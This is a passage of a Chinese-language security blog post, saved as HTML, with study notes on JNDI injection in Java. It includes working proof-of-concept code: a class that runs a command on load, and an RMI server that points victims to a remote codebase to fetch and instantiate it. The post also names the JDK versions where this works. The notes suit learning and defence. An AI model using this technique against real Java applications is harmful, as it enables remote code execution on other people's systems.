@@ -1,0 +1,1172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="k2436165">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://k2436165.github.io/pages/d8e02fc8f1ad/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="JNDI 注入学习笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI 注入">
+<meta property="og:url" content="https://k2436165.github.io/pages/d8e02fc8f1ad/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="JNDI 注入学习笔记">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://k2436165.github.io/images/300c74bf65dbcc75b65af3d7e7dfc71f_MD5.jpeg">
+<meta property="og:image" content="https://k2436165.github.io/images/44fc4dfde1c6dc6f58973ed009043618_MD5.jpeg">
+<meta property="og:image" content="https://k2436165.github.io/images/e59d49bc8828a0c0b08b0c6a33cfa4b8_MD5.jpeg">
+<meta property="og:image" content="https://k2436165.github.io/images/d07d03af54edd3bd1536adc21ff426bd_MD5.jpeg">
+<meta property="og:image" content="https://k2436165.github.io/images/5e74fad48fe9b0c7ccf4b4730f0c5788_MD5.jpeg">
+<meta property="og:image" content="https://k2436165.github.io/images/22625492ee872b23da97c9bfb1ea4eca_MD5.jpeg">
+<meta property="og:image" content="https://k2436165.github.io/images/209fb4f329ccdef1470485cb0f0ffe05_MD5.jpeg">
+<meta property="article:published_time" content="2024-04-21T13:14:25.000Z">
+<meta property="article:modified_time" content="2024-04-23T06:09:16.327Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="JNDI 注入">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://k2436165.github.io/images/300c74bf65dbcc75b65af3d7e7dfc71f_MD5.jpeg">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            JNDI 注入 -
+        
+        k2436165&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"k2436165.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":false,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/bg-light.png","dark":"/images/bg-dark.png"},"title":"k2436165's blog","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":false,"color":{"left":"#515b5d","right":"#1a1d21","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-bookmark"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/friends"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/03/30 17:03:18"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                k2436165&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-bookmark fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/friends">
+                                                    FRIENDS
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-regular fa-bookmark fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/friends">FRIENDS</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">JNDI 注入</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/avatar.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">k2436165</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-04-21 21:14:25</span>
+        <span class="mobile">2024-04-21 21:14:25</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-04-23 14:09:16</span>
+            <span class="mobile">2024-04-23 14:09:16</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Java-%E5%AE%89%E5%85%A8/">Java 安全</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/JNDI-%E6%B3%A8%E5%85%A5/">JNDI 注入</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>6.1k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>32 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="JNDI-是什么"><a href="#JNDI-是什么" class="headerlink" title="JNDI 是什么"></a>JNDI 是什么</h1><p>Java 命名和目录接口（JNDI）是为使用 Java 编程语言编写的应用程序提供命名和目录功能的应用程序编程接口（API），它被定义为与任何特定目录服务实现无关</p>
+<p>简单来说，就是为了<strong>更方便的获取资源</strong>，提供名字和目录（属性），JNDI 来查找和访问这些资源</p>
+<p>贴一张经典的体系结构的图</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/300c74bf65dbcc75b65af3d7e7dfc71f_MD5.jpeg"
+                     
+                ></p>
+<p>JNDI API 独立与命名系统，这一层有助于将应用与实际数据源分离</p>
+<p>JNDI 提供了服务提供者接口（SPI），这一层实现了应用与命名服务或目录服务交互</p>
+<h1 id="JNDI-工作流程"><a href="#JNDI-工作流程" class="headerlink" title="JNDI 工作流程"></a>JNDI 工作流程</h1><p>JNDI 依赖 Context 与服务交互，所以使用前需要初始化 Context</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">System.setProperty(Context.PROVIDER_URL, <span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br></pre></td></tr></table></figure></div>
+
+<p>或者</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,  <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">env.put(Context.PROVIDER_URL,  <span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line"><span class="type">Context</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br></pre></td></tr></table></figure></div>
+
+<p>得到 Context 后与服务进行交互，主要有五个方法进行交互</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将名称绑定到对象</span></span><br><span class="line">bind(Name name, Object obj)</span><br><span class="line"></span><br><span class="line"><span class="comment">//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名</span></span><br><span class="line">list(String name)</span><br><span class="line"></span><br><span class="line"><span class="comment">//检索命名对象</span></span><br><span class="line">lookup(String name)</span><br><span class="line"></span><br><span class="line"><span class="comment">//将名称重绑定到对象</span></span><br><span class="line">rebind(String name, Object obj)</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消绑定命名对象</span></span><br><span class="line">unbind(String name)</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="JNDI-动态协议转换"><a href="#JNDI-动态协议转换" class="headerlink" title="JNDI 动态协议转换"></a>JNDI 动态协议转换</h1><p>上面两个例子，都是手动配置了 <code>_INITIAL_CONTEXT_FACTORY_</code> 和 <code>PROVIDER_URL</code>，这样 JNDI 就能够识别需要调用的服务和服务所在的路径</p>
+<p>但是，JNDI 具有动态协议转换特性，它可以自动转换 dns、rmi、ldap 等协议，也就是说，即使不通过相应的环境变量对 Context 初始化，JNDI 仍然能识别出需要调用的服务和服务所在路径</p>
+<h1 id="JNDI-Reference"><a href="#JNDI-Reference" class="headerlink" title="JNDI Reference"></a>JNDI Reference</h1><p>在一个实际的服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，引用中包含了获取实际对象所需的信息，甚至对象的实际状态</p>
+<p>例如下面这个 Reference 实例</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;refClassName&quot;</span>, <span class="string">&quot;refFactoryName&quot;</span>, <span class="string">&quot;http://127.0.0.1:7899/&quot;</span>);</span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(refObj);</span><br><span class="line">registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br></pre></td></tr></table></figure></div>
+
+<p>refObj 就是一个 refClassName 的引用，这里结合 RMI 协议，通过 ReferenceWrapper 把一个 Reference 对象包装成 Remote 对象后，就可以利用 RMI 将引用转换成一个可用的对象</p>
+<p><em>注：<code>com.sun.jndi.rmi.registry.ReferenceWrapper</code> 在新版本的 JDK 中被移除，需要额外引入对应 jar 包</em></p>
+<h1 id="JNDI-注入"><a href="#JNDI-注入" class="headerlink" title="JNDI 注入"></a>JNDI 注入</h1><p>JNDI 存在动态协议转换，所以可以配合多种协议进行攻击，或者说，JNDI 注入攻击就是向 JNDI Context 里注入不同协议进行的攻击</p>
+<p>利用思路如下（又是一张经典老图</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/44fc4dfde1c6dc6f58973ed009043618_MD5.jpeg"
+                     
+                ></p>
+<p>作为 JNDI 注入受害者的客户端代码并不会发生什么的改变，只是改变 <code>PROVIDER_URL</code>，所以 <code>PROVIDER_URL</code> 可控也是 JNDI 注入的利用条件</p>
+<p>JNDI 客户端实现</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/exploit&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h2><p>利用 Reference，实例化远程的恶意类文件</p>
+<p>恶意类</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Name;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><em>注：此处 Exp 继承自 ObjectFactory 只是为了减少报错，不影响实际命令执行（如果不继承 ObjectFactory 会报 <code>Exception in thread &quot;main&quot; javax.naming.NamingException [Root exception is java.lang.ClassCastException: Exp cannot be cast to javax.naming.spi.ObjectFactory]</code>，但命令已经执行完成）</em></p>
+<p>服务端</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);  </span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exp&quot;</span>, <span class="string">&quot;Exp&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/&quot;</span>);  </span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(refObj);  </span><br><span class="line">        registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>攻击流程：启动服务端，还需要启动一个带恶意类的服务器，客户端会先从服务端获取到 Reference 对象，然后再根据 Reference 中的地址获取恶意类并实例化</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/e59d49bc8828a0c0b08b0c6a33cfa4b8_MD5.jpeg"
+                     
+                ></p>
+<p>所以启动客户端后，8888 上就会出现获取恶意类的请求</p>
+<h2 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h2><p>和 JNDI+RMI 的原理基本一致，只是换了个媒介，而且还不受 JNDI+RMI 中的 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 等属性的限制，在 JDK  8u113、7u122、6u132 之后的版本仍可使用（直到 JDK 11.0.1、8u191、7u201、6u211 后限制了 LDAP 远程工厂类的加载）</p>
+<p>使用 LDAP 服务需要先导入依赖</p>
+<p>pom. xml</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>服务端</p>
